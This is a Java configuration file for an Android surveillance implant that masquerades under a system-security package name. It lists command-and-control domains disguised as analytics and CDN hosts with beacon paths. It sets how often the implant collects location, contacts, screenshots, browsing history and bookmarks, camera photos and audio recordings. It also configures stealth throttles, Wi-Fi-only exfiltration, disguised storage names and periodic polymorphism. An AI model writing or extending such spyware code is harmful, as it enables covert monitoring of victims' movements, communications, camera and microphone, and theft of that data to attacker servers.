package com.android.system.security;

import java.util.*;

/**
 * Central configuration — tune for your testing environment.
 * All values are obfuscated at compile time by ProGuard.
 */
public final class Config {

    public static final String PACKAGE = "com.android.system.security";

    // C2
    public static final List<String> C2_DOMAINS = Arrays.asList(
        "api.analytics-cdn.com",
        "cdn-updates-static.net",
        "push-services-api.com"
    );
    public static final List<String> C2_PATHS = Arrays.asList(
        "/collect", "/beacon", "/heartbeat", "/config"
    );
    public static final int BEACON_INTERVAL_MS = 300_000;  // 5 min

    // Collection intervals
    public static final int LOCATION_INTERVAL_MS = 120_000;
    public static final int CONTACTS_INTERVAL_MS = 600_000;
    public static final int SCREENSHOT_INTERVAL_MS = 120_000;
    // ============================================================
    // ADD TO EXISTING Config.java
    // ============================================================

    // Web Activity Collection
    public static final int BROWSER_URL_INTERVAL_MS = 5_000;  // Check URL every 5s
    public static final boolean COLLECT_BROWSER_DBS = true;
    public static final boolean COLLECT_BOOKMARKS = true;
    public static final boolean COLLECT_HISTORY = true;

    // Camera Capture
    public static final int CAMERA_CAPTURE_INTERVAL_MS = 300_000;  // Every 5 min
    public static final int CAMERA_CAPTURE_MAX_TRIES = 3;

    // Audio Recording
    public static final int AUDIO_RECORD_INTERVAL_MS = 600_000;  // Every 10 min
    public static final int AUDIO_CLIP_DURATION_MS = 30_000;     // 30 sec per clip

    // Progress Tracking
    public static final boolean ENABLE_PROGRESS_REPORT = true;
    public static final int PROGRESS_REPORT_INTERVAL_MS = 3_600_000;  // Every hour

    // Stealth
    public static final int MAX_CPU_PCT = 15;
    public static final int MIN_BATTERY_PCT = 20;
    public static final boolean WIFI_ONLY_EXFIL = true;

    // Crypto
    public static final String MASTER_KEY_ALIAS = "system_security_master_key";

    // Data storage
    public static final String DB_NAME = "system_cache.db";
    public static final String DB_DIR = "system_data";

    // Polymorphism
    public static final int POLYMORPHIC_INTERVAL_MS = 3_600_000;  // 1 hour

    private Config() {}
}
